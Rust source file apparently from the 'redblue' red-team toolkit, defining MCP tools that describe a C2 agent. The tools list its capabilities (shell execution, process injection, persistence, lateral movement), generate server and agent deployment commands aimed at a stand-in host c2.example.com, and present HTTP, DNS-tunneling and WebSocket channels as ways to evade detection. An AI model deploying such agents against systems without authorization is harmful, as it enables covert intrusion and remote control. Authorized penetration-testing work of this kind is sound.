//! Agent C2 MCP Tools
//!
//! Informational tools for the C2 agent subsystem. These tools provide
//! configuration details, capability listings, and transport information.
//! Actual C2 operations require explicit authorization and are performed
//! via the CLI or agent shell.

use crate::mcp::types::{ToolDefinition, ToolField, ToolResult};
use crate::mcp::McpServer;
use crate::utils::json::JsonValue;

/// Register agent C2 tools with the server
pub fn register_agent_tools() -> Vec<ToolDefinition<McpServer>> {
    vec![
        ToolDefinition {
            name: "rb.agent.info",
            description: "Show agent configuration, capabilities, and architecture overview. \
                         Provides details about the C2 agent subsystem including supported \
                         commands, encryption (X25519 + ChaCha20-Poly1305 with Double Ratchet), \
                         transport options, and session management. AUTHORIZED USE ONLY.",
            fields: &[ToolField {
                name: "verbose",
                field_type: "boolean",
                description: "Show detailed technical information including protocol specifics (default: false).",
                required: false,
            }],
            handler: tool_agent_info,
        },
        ToolDefinition {
            name: "rb.agent.generate",
            description: "Generate the CLI command and configuration for building an agent binary \
                         or configuration file for a target. Covers server URL, transport settings, \
                         beacon interval, jitter, and fallback configuration. \
                         AUTHORIZED USE ONLY - ensure written authorization before deployment.",
            fields: &[
                ToolField {
                    name: "server",
                    field_type: "string",
                    description: "C2 server URL (e.g., 'http://10.0.0.1:4444' or 'https://c2.example.com').",
                    required: true,
                },
                ToolField {
                    name: "transport",
                    field_type: "string",
                    description: "Primary transport: 'http', 'dns', 'websocket' (default: 'http').",
                    required: false,
                },
                ToolField {
                    name: "interval",
                    field_type: "number",
                    description: "Beacon interval in seconds (default: 60).",
                    required: false,
                },
                ToolField {
                    name: "jitter",
                    field_type: "number",
                    description: "Jitter factor 0.0-1.0 to randomize beacon timing (default: 0.1).",
                    required: false,
                },
                ToolField {
                    name: "dns_domain",
                    field_type: "string",
                    description: "DNS domain for DNS transport fallback (e.g., 'c2.example.com').",
                    required: false,
                },
            ],
            handler: tool_agent_generate,
        },
        ToolDefinition {
            name: "rb.agent.transports",
            description: "List available transport types for C2 communication with detailed \
                         specifications. Covers HTTP, DNS tunneling, and WebSocket transports \
                         including their capabilities, trade-offs, and configuration options.",
            fields: &[ToolField {
                name: "transport",
                field_type: "string",
                description: "Show details for a specific transport: 'http', 'dns', 'websocket'. If omitted, lists all.",
                required: false,
            }],
            handler: tool_agent_transports,
        },
    ]
}

fn tool_agent_info(_server: &mut McpServer, args: &JsonValue) -> Result<ToolResult, String> {
    let verbose = args
        .get("verbose")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    let version = crate::agent::AGENT_VERSION;
    let default_port = crate::agent::DEFAULT_PORT;

    let capabilities = vec![
        "Command execution (shell, exec, powershell)",
        "File operations (upload, download, list, delete)",
        "Process management (list, kill, inject)",
        "Network reconnaissance (scan, pivot, tunnel)",
        "Registry access (Windows)",
        "Service management",
        "Persistence mechanisms",
        "Lateral movement",
    ];

    let security_features = vec![
        "X25519 Diffie-Hellman key exchange",
        "ChaCha20-Poly1305 AEAD encryption",
        "Double Ratchet protocol (Signal-based forward secrecy)",
        "Per-message unique encryption keys",
        "Automatic key ratcheting on DH exchange",
        "Skipped message key management",
        "Session ID randomization",
    ];

    let mut text = format!(
        "redblue C2 Agent v{}\n\
         Default port: {}\n\n\
         WARNING: AUTHORIZED USE ONLY\n\
         Ensure you have written authorization before deploying agents.\n\n\
         Capabilities:\n{}\n\n\
         Security:\n{}",
        version,
        default_port,
        capabilities
            .iter()
            .map(|c| format!("  - {}", c))
            .collect::<Vec<_>>()
            .join("\n"),
        security_features
            .iter()
            .map(|f| format!("  - {}", f))
            .collect::<Vec<_>>()
            .join("\n"),
    );

    if verbose {
        text.push_str(&format!(
            "\n\nProtocol Details:\n\
             - Beacon magic: 0x{:08X} (\"RBLU\")\n\
             - Protocol version: {}\n\
             - Message types: Beacon, Response, Command, KeyExchange\n\
             - Nonce size: 12 bytes (ChaCha20)\n\
             - DH public key size: 32 bytes (X25519)\n\
             - Auth tag size: 16 bytes (Poly1305)\n\
             - Max skipped message keys: 1000\n\n\
             Session Management:\n\
             - Status: Active -> Dormant (5 min) -> Dead (1 hour)\n\
             - State persistence via RedDB\n\
             - Per-session Double Ratchet state\n\
             - Command/response queues per session\n\n\
             Transport Chain:\n\
             - Auto-fallback between transports\n\
             - Configurable fallback threshold (default: 3 failures)\n\
             - Transport health monitoring (Healthy/Degraded/Unhealthy)\n\
             - Per-transport statistics (bytes, latency, errors)",
            crate::agent::protocol::BEACON_MAGIC,
            crate::agent::protocol::PROTOCOL_VERSION,
        ));
    }

    let capabilities_json: Vec<JsonValue> = capabilities
        .iter()
        .map(|c| JsonValue::String(c.to_string()))
        .collect();

    let security_json: Vec<JsonValue> = security_features
        .iter()
        .map(|f| JsonValue::String(f.to_string()))
        .collect();

    let mut data_fields = vec![
        (
            "version".to_string(),
            JsonValue::String(version.to_string()),
        ),
        (
            "default_port".to_string(),
            JsonValue::Number(default_port as f64),
        ),
        (
            "capabilities".to_string(),
            JsonValue::array(capabilities_json),
        ),
        (
            "security_features".to_string(),
            JsonValue::array(security_json),
        ),
        (
            "transports".to_string(),
            JsonValue::array(vec![
                JsonValue::String("http".to_string()),
                JsonValue::String("dns".to_string()),
                JsonValue::String("websocket".to_string()),
            ]),
        ),
        ("authorization_required".to_string(), JsonValue::Bool(true)),
    ];

    if verbose {
        data_fields.push((
            "protocol".to_string(),
            JsonValue::object(vec![
                (
                    "beacon_magic".to_string(),
                    JsonValue::String(format!("0x{:08X}", crate::agent::protocol::BEACON_MAGIC)),
                ),
                (
                    "version".to_string(),
                    JsonValue::Number(crate::agent::protocol::PROTOCOL_VERSION as f64),
                ),
                (
                    "message_types".to_string(),
                    JsonValue::array(vec![
                        JsonValue::String("Beacon".to_string()),
                        JsonValue::String("Response".to_string()),
                        JsonValue::String("Command".to_string()),
                        JsonValue::String("KeyExchange".to_string()),
                    ]),
                ),
                ("nonce_bytes".to_string(), JsonValue::Number(12.0)),
                ("dh_key_bytes".to_string(), JsonValue::Number(32.0)),
                ("tag_bytes".to_string(), JsonValue::Number(16.0)),
            ]),
        ));
    }

    Ok(ToolResult {
        text,
        data: JsonValue::object(data_fields),
    })
}

fn tool_agent_generate(_server: &mut McpServer, args: &JsonValue) -> Result<ToolResult, String> {
    let server_url = args
        .get("server")
        .and_then(|v| v.as_str())
        .ok_or("Missing required field: server")?;

    let transport = args
        .get("transport")
        .and_then(|v| v.as_str())
        .unwrap_or("http");

    let interval = args
        .get("interval")
        .and_then(|v| v.as_f64())
        .unwrap_or(60.0);

    let jitter = args.get("jitter").and_then(|v| v.as_f64()).unwrap_or(0.1);

    let dns_domain = args.get("dns_domain").and_then(|v| v.as_str());

    // Validate transport
    match transport {
        "http" | "dns" | "websocket" => {}
        other => {
            return Err(format!(
                "Unknown transport '{}'. Valid: http, dns, websocket",
                other
            ))
        }
    }

    // Validate jitter range
    if !(0.0..=1.0).contains(&jitter) {
        return Err("Jitter must be between 0.0 and 1.0".to_string());
    }

    // Build CLI command for starting the server
    let server_cmd = format!(
        "rb agent server start --bind {}",
        server_url
            .strip_prefix("http://")
            .or_else(|| server_url.strip_prefix("https://"))
            .unwrap_or(server_url)
    );

    // Build CLI command for generating/running the agent
    let mut agent_cmd = format!(
        "rb agent client start --server {} --transport {} --interval {} --jitter {}",
        server_url, transport, interval as u64, jitter
    );

    if let Some(domain) = dns_domain {
        agent_cmd.push_str(&format!(" --dns-domain {}", domain));
    }

    // Calculate effective beacon range with jitter
    let min_interval = interval * (1.0 - jitter);
    let max_interval = interval * (1.0 + jitter);

    let text = format!(
        "Agent generation configuration:\n\n\
         WARNING: AUTHORIZED USE ONLY\n\
         Deploy agents ONLY on systems you own or have written authorization to test.\n\n\
         Server:    {}\n\
         Transport: {} (primary){}\n\
         Interval:  {}s (effective: {:.0}s - {:.0}s with {:.0}% jitter)\n\n\
         Step 1 - Start C2 server:\n  {}\n\n\
         Step 2 - Deploy agent:\n  {}\n\n\
         Features:\n\
         - X25519 key exchange on first beacon\n\
         - Double Ratchet encryption for all subsequent messages\n\
         - Automatic transport fallback (HTTP -> DNS)\n\
         - Session persistence across restarts\n\
         - Command queue with async response delivery",
        server_url,
        transport.to_uppercase(),
        if let Some(domain) = dns_domain {
            format!(" + DNS fallback ({})", domain)
        } else {
            String::new()
        },
        interval as u64,
        min_interval,
        max_interval,
        jitter * 100.0,
        server_cmd,
        agent_cmd,
    );

    let mut data_fields = vec![
        (
            "server_url".to_string(),
            JsonValue::String(server_url.to_string()),
        ),
        (
            "transport".to_string(),
            JsonValue::String(transport.to_string()),
        ),
        ("interval_seconds".to_string(), JsonValue::Number(interval)),
        ("jitter".to_string(), JsonValue::Number(jitter)),
        (
            "effective_min_interval".to_string(),
            JsonValue::Number(min_interval),
        ),
        (
            "effective_max_interval".to_string(),
            JsonValue::Number(max_interval),
        ),
        ("server_command".to_string(), JsonValue::String(server_cmd)),
        ("agent_command".to_string(), JsonValue::String(agent_cmd)),
        ("authorization_required".to_string(), JsonValue::Bool(true)),
    ];

    if let Some(domain) = dns_domain {
        data_fields.push((
            "dns_domain".to_string(),
            JsonValue::String(domain.to_string()),
        ));
    }

    Ok(ToolResult {
        text,
        data: JsonValue::object(data_fields),
    })
}

fn tool_agent_transports(_server: &mut McpServer, args: &JsonValue) -> Result<ToolResult, String> {
    let specific = args.get("transport").and_then(|v| v.as_str());

    let http_info = TransportInfo {
        name: "HTTP",
        module: "agent::transport::http",
        description: "Standard HTTP/HTTPS transport with endpoint rotation. \
                      Beacons disguised as normal web traffic. Supports TLS with \
                      optional certificate pinning.",
        pros: vec![
            "Blends with normal web traffic",
            "Works through most firewalls and proxies",
            "TLS encryption layer (double-encrypted with ratchet)",
            "Endpoint rotation for resilience",
            "Custom headers for evasion",
        ],
        cons: vec![
            "Requires HTTP/HTTPS outbound access",
            "Detectable by deep packet inspection if patterns emerge",
            "Higher bandwidth than DNS",
        ],
        config: vec![
            ("server_url", "C2 server URL (http:// or https://)"),
            ("endpoints", "List of endpoint paths to rotate through"),
            ("use_tls", "Enable TLS (recommended for production)"),
            ("tls_verify", "Verify server TLS certificates"),
            ("cert_pins", "SHA256 certificate fingerprints for pinning"),
            (
                "custom_headers",
                "Additional HTTP headers (User-Agent, etc.)",
            ),
        ],
        cli_example: "rb agent client start --server https://c2.example.com --transport http",
    };

    let dns_info = TransportInfo {
        name: "DNS",
        module: "agent::transport::dns",
        description: "DNS tunneling transport using TXT records. Data is encoded in DNS \
                      queries and responses, making it harder to detect and block. \
                      Works even in highly restricted networks where only DNS is allowed.",
        pros: vec![
            "Works in highly restricted networks",
            "Difficult to block without breaking DNS",
            "Low profile in network logs",
            "Effective fallback when HTTP is blocked",
        ],
        cons: vec![
            "Low bandwidth (limited by DNS packet size)",
            "Higher latency than HTTP",
            "May trigger DNS anomaly detection",
            "Requires a controlled DNS domain",
        ],
        config: vec![
            ("domain", "DNS domain to use for tunneling"),
            ("nameserver", "Custom DNS resolver (default: system)"),
            ("record_type", "DNS record type: TXT (default), CNAME, MX"),
            ("encoding", "Data encoding: base32 (default), base64, hex"),
        ],
        cli_example: "rb agent client start --server http://c2.example.com --transport dns --dns-domain t.example.com",
    };

    let ws_info = TransportInfo {
        name: "WebSocket",
        module: "agent::transport::websocket",
        description: "Full-duplex WebSocket communication. Provides real-time bidirectional \
                      data exchange after initial HTTP upgrade handshake. Ideal for \
                      interactive sessions and high-throughput operations.",
        pros: vec![
            "Full-duplex communication (real-time)",
            "Lower overhead than HTTP polling",
            "Persistent connection reduces latency",
            "Looks like legitimate WebSocket traffic",
        ],
        cons: vec![
            "Persistent connection may be noticed",
            "Some proxies/firewalls block WebSocket upgrades",
            "Connection drop requires reconnection overhead",
            "Not suitable for very restrictive networks",
        ],
        config: vec![
            ("server_url", "WebSocket server URL (ws:// or wss://)"),
            ("path", "WebSocket endpoint path"),
            ("use_tls", "Enable TLS (wss://)"),
            ("ping_interval", "Keep-alive ping interval in seconds"),
            ("reconnect_delay", "Delay before reconnection attempts"),
        ],
        cli_example: "rb agent client start --server wss://c2.example.com/ws --transport websocket",
    };

    let all_transports = vec![&http_info, &dns_info, &ws_info];

    let transports_to_show: Vec<&&TransportInfo> = if let Some(name) = specific {
        let matched = all_transports
            .iter()
            .filter(|t| t.name.to_lowercase() == name.to_lowercase())
            .collect::<Vec<_>>();

        if matched.is_empty() {
            return Err(format!(
                "Unknown transport '{}'. Valid: http, dns, websocket",
                name
            ));
        }
        matched
    } else {
        all_transports.iter().collect()
    };

    let mut text_parts = Vec::new();
    let mut transports_json = Vec::new();

    for transport in &transports_to_show {
        let pros_text = transport
            .pros
            .iter()
            .map(|p| format!("    + {}", p))
            .collect::<Vec<_>>()
            .join("\n");

        let cons_text = transport
            .cons
            .iter()
            .map(|c| format!("    - {}", c))
            .collect::<Vec<_>>()
            .join("\n");

        let config_text = transport
            .config
            .iter()
            .map(|(k, v)| format!("    {}: {}", k, v))
            .collect::<Vec<_>>()
            .join("\n");

        text_parts.push(format!(
            "{} Transport ({})\n\
             {}\n\n\
             Advantages:\n{}\n\n\
             Disadvantages:\n{}\n\n\
             Configuration:\n{}\n\n\
             Example:\n  {}",
            transport.name,
            transport.module,
            transport.description,
            pros_text,
            cons_text,
            config_text,
            transport.cli_example,
        ));

        let pros_json: Vec<JsonValue> = transport
            .pros
            .iter()
            .map(|p| JsonValue::String(p.to_string()))
            .collect();

        let cons_json: Vec<JsonValue> = transport
            .cons
            .iter()
            .map(|c| JsonValue::String(c.to_string()))
            .collect();

        let config_json: Vec<JsonValue> = transport
            .config
            .iter()
            .map(|(k, v)| {
                JsonValue::object(vec![
                    ("name".to_string(), JsonValue::String(k.to_string())),
                    ("description".to_string(), JsonValue::String(v.to_string())),
                ])
            })
            .collect();

        transports_json.push(JsonValue::object(vec![
            (
                "name".to_string(),
                JsonValue::String(transport.name.to_string()),
            ),
            (
                "module".to_string(),
                JsonValue::String(transport.module.to_string()),
            ),
            (
                "description".to_string(),
                JsonValue::String(transport.description.to_string()),
            ),
            ("advantages".to_string(), JsonValue::array(pros_json)),
            ("disadvantages".to_string(), JsonValue::array(cons_json)),
            ("configuration".to_string(), JsonValue::array(config_json)),
            (
                "cli_example".to_string(),
                JsonValue::String(transport.cli_example.to_string()),
            ),
        ]));
    }

    let text = format!(
        "C2 Agent Transports{}\n\n{}",
        if let Some(name) = specific {
            format!(" ({})", name)
        } else {
            " (all)".to_string()
        },
        text_parts.join("\n\n---\n\n"),
    );

    Ok(ToolResult {
        text,
        data: JsonValue::object(vec![
            (
                "transport_count".to_string(),
                JsonValue::Number(transports_to_show.len() as f64),
            ),
            ("transports".to_string(), JsonValue::array(transports_json)),
        ]),
    })
}

/// Internal helper for transport information
struct TransportInfo {
    name: &'static str,
    module: &'static str,
    description: &'static str,
    pros: Vec<&'static str>,
    cons: Vec<&'static str>,
    config: Vec<(&'static str, &'static str)>,
    cli_example: &'static str,
}
